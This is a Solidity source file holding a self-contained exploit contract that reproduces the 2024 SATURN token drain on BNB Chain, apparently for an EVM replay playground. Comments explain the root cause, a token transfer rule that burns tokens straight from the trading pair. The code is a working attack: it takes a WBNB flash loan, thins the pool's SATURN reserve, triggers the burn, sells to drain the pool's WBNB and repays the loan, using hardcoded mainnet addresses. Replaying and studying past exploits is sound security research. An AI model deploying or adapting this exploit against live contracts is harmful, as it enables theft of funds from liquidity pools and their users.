// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-05-SATURN).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (attacker = address(this), and the PancakeSwap-V3 flash callback
// `pancakeV3FlashCallback` lives on the test itself) — there is no standalone
// attack contract to deploy. This contract is a faithful, self-contained copy
// of that inline attack (testExploit's flash-loan trigger + the flash callback
// body) so the playground can deploy it and record run(). Logic and constants
// are copied verbatim from test/SATURN_exp.sol; the enableSwitch toggle and
// SATURN seeding (which require pranking the token owner / a SATURN holder)
// are handled by the config's `setup` block instead, since those steps run
// BEFORE this contract's entrypoint.
//
// Root cause: Saturn._transfer() burns SATURN directly out of the AMM pair's
// own balance on every sell (autoLiquidityPairTokens -> recordBurn(pair, ...)
// + pair.sync()), with no matching WBNB outflow. A flash-loan-funded "corner
// buy" thins the pool's SATURN reserve, then a single transfer-to-pair wipes
// almost the entire remaining reserve, letting the attacker's follow-up sell
// drain nearly all the pool's WBNB.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IPancakeRouter {
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract SaturnDrain {
    address internal constant SATURN_CREATER = 0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62;

    IPancakeV3Pool internal constant pancakeV3Pool = IPancakeV3Pool(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IPancakePair internal constant pair_WBNB_SATURN = IPancakePair(0x49BA6c20D3e95374fc1b19D537884b5595AA6124);
    IPancakeRouter internal constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IERC20 internal constant SATURN = IERC20(0x9BDF251435cBC6774c7796632e9C80B233055b93);
    IERC20 internal constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    uint256 internal constant flashAmt = 3300 ether;
    uint256 internal constant finalSaturnSellAmt = 228_832_951_945_080_091_523_153;

    // Entry point. By the time this runs, the config's `setup` block has
    // already: pranked SATURN_CREATER to disable enableSwitch, pranked the
    // historical holder to seed this contract with SATURN, and pranked
    // SATURN_CREATER again to re-enable enableSwitch — mirroring
    // testExploit()'s approveAll() + EnableSwitch(false) + SATURN.transfer +
    // EnableSwitch(true) sequence.
    function run() external {
        SATURN.approve(address(router), type(uint256).max);
        WBNB.approve(address(router), type(uint256).max);

        pancakeV3Pool.flash(address(this), 0, flashAmt, bytes(""));
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        // Get the everyTimeSellLimitAmount from the SATURN contract
        (, bytes memory result) = address(SATURN).call(abi.encodeWithSignature("everyTimeSellLimitAmount()"));
        uint256 limit = abi.decode(result, (uint256));

        // Get the current balance of SATURN in the pair_WBNB_SATURN pool
        uint256 amount = SATURN.balanceOf(address(pair_WBNB_SATURN));

        // Define the swap paths
        address[] memory buyPath = getPath(address(WBNB), address(SATURN));
        address[] memory sellPath = getPath(address(SATURN), address(WBNB));

        // Calculate the amount of WBNB needed to swap for SATURN
        uint256[] memory amounts = router.getAmountsIn(amount - limit, buyPath);

        // Swap WBNB for SATURN and send the SATURN to the SATURN_creater (discarded)
        router.swapExactTokensForTokens(amounts[0], 0, buyPath, SATURN_CREATER, type(uint256).max);

        // Update the amount of SATURN in the pair_WBNB_SATURN pool
        amount = SATURN.balanceOf(address(pair_WBNB_SATURN));

        // Transfer a specific amount of SATURN to the pair_WBNB_SATURN pool.
        // This triggers Saturn._transfer's AutoNukeLP path: it burns SATURN
        // directly from the pair's own balance and calls pair.sync(), crashing
        // the pool's SATURN reserve without removing any WBNB.
        SATURN.transfer(address(pair_WBNB_SATURN), finalSaturnSellAmt);

        // Get the current reserves of SATURN and WBNB in the pair_WBNB_SATURN pool
        (uint256 SATURN_reserve,,) = pair_WBNB_SATURN.getReserves();

        // Update the amount of SATURN in the pair_WBNB_SATURN pool
        amount = SATURN.balanceOf(address(pair_WBNB_SATURN));

        // Calculate the amount of WBNB that will be received when swapping SATURN
        amounts = router.getAmountsOut(amount - SATURN_reserve, sellPath);

        // Perform the swap in the pair_WBNB_SATURN pool and send the WBNB to this contract
        pair_WBNB_SATURN.swap(0, amounts[1], address(this), bytes(""));

        // Transfer WBNB to the pancakeV3Pool, including the fee
        WBNB.transfer(address(pancakeV3Pool), flashAmt + fee1);
    }

    function getPath(address token0, address token1) internal pure returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1;
        return path;
    }

    fallback() external payable {}
}
